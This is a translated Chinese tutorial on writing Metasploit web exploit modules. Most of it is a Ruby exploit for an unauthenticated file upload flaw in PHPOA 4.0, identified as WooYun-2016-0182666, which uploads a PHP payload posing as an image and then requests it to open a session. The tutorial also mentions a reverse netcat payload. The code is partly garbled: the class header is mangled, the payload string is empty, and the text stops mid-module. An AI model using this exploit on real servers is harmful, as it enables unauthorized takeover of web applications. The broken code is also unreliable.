# Metasploit module开发WEB篇
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
**Metasploit是款渗透神器,尤其是在拿到会话后撸内网那感觉更是爽上天。  
**
**在平常的渗透测试过程中,多是通过撸掉web拿到shell进入内网,所以在拿到shell后往往就会想办法获取个metasploit的会话,方便后面往下撸。对于那些通用CMS的漏洞,拿shell到获取会话的过程可以通过编写模块来搞定,提高效率,避免重复工作,同时也可以通过提交模块到长矛获得一些收入。**
如标题所写,本文主要介绍web渗透相关模块的开发,二进制玩不来,等学会了再来和大家分享。
**前言:**
Web中漏洞类型那么多,有些十分适合拿来写exploit模块,像文件上传、命令执、代码执行这种,很容易就拿到shell获取会话。相比那些比较鸡肋的洞,难以对服务器直接造成威胁,缺乏适用性或本身价值就不大,比如同样是sql注入,有的服务器权限没做好能拿shell,但是在没有丁点写权限的情况下也只能来搞出来点数据而已;还有文件包含之类的洞,受太多环境变量影响;XSS、CSRF、SSRF这些就更不用说了,还有权限没做好导致信息泄漏之类的洞;就只能拿来写辅助模块(auxiliary)
**准备:**
码代码前先把工具准备好。
metasploit框架推荐从git上下载,kali里带的那个版本比较低,低版本框架中module用的类名称是Metasploit3,而新框架中已经改名成MetasploitModule,继续使用的话会产生警告;同时新框架下的payload也有改变,以cmd/unix/reverse_netcat为例,在新框架下更名成了cmd/unix/reverse_netcat_
gaping;新框架下payload支持使用代理,通过代理可以很方便的调试,这也是推荐使用新框架的重要原因。Metasploit支持通过-m
参数加载指定路径的模块,所以可以通过命令mkdir –p ~/module/{auxiliary, exploits}/
先在家目录下创建文件夹,然后通过msfconsole –m ~/module/
加载目录下的模块,编辑模块后在msf控制台通过reload命令重新载入,方便调试代码,不过据我测试,reload命令只对exploits目录下的模块有效。。。
一款顺手的代理工具,拿来调试插件。我倾向用burpsuit,其他的也可以,只要能得到框架发出的数据包就行(刚开始写插件的时候太年轻,直接上wireshark看数据的。。。)。
**开整:**
首先是exploit模块的编写,以phpoa4.0任意文件上传导致getshell漏洞为例,乌云漏洞编号为[wooyun-2016-0182666](http://www.wooyun.org/bugs/wooyun-2016-0182666),通过漏洞说明和证明很容易理解漏洞,利用方式简单粗暴,直接构造表单上传。所以我们的模块就是要上传个带有payload的php文件,然后访问这个php文件,获得metasploit会话。看代码:
    #引入msf的核心框架代码
    require 'msf/core'
    #声明新的类,继承自Msf::Exploit::Remote
    class MetasploitModule  '  PHPOAV4.0任意文件上传',
                          'Description' => %q{
                                upload/index.php 无需登录等认证即可上传任意文件,商业授权版,企业应用版,政务版,集团版通杀
                                     },
                          'Author' =>
                              [
                                  '3xpl0it',#漏洞作者
                                  '扶摇直上打飞机'#插件作者
                              ],
                          'License' => MSF_LICENSE,
                          'References' =>
                              [
                                  ['url', 'http://www.wooyun.org/bugs/wooyun-2016-0182666']
                              ],
                          'Privileged' => true,
    #指定目标平台类型
                          'Platform' => ['php'],
                          'Targets' => [['all of them', {}],],
    #指定目标框架架构
                          'Arch' => ARCH_PHP,
                          'DefaultTarget' => 0,
              ))
    #注册参数
        register_options(
            [
                Opt::RHOST(),
                Opt::RPORT(80),
                OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
            ], self.class)
      end
    #定义上传函数
      def upload
    #定义个全局文件名变量,一个随机的文件名
        @fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    #生成要上传的payload
        php = ""
    #实例化MIME消息体
        data = Rex::MIME::Message.new
        data.add_part(php, 'image/jpeg', nil, "form-data; name="files"; filename="#{@fname}"")
        post_data = data.to_s
        print_status("Uploading #{@fname} payload...")
    #上传文件
        res = send_request_cgi({
                                   'method' => 'POST',
                                   'uri' => normalize_uri(target_uri.path, 'upload', 'index.php'),
                                   'ctype' => "multipart/form-data; boundary=#{data.bound}",
                                   'data' => post_data,
                               })
    #验证上传及访问上传文件获得会话
        if res.code.to_s == '200'
          json = JSON.parse(res.body)
          tempfile = json['files'][0]['url']
          shellpath = normalize_uri(target_uri.path, 'upload', tempfile)
          print_good("Shell address:#{shellpath}")
          print_status("Executing the payload...")
          send_request_cgi(
              {
                  'uri' => shellpath,
                  'method' => 'GET'
              }, 5)
          print_good("Executed payload")
        else
          fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
        end
      end
      def exploit
        upload
      end
      def rhost
        datastore['RHOST']
      end
      def rport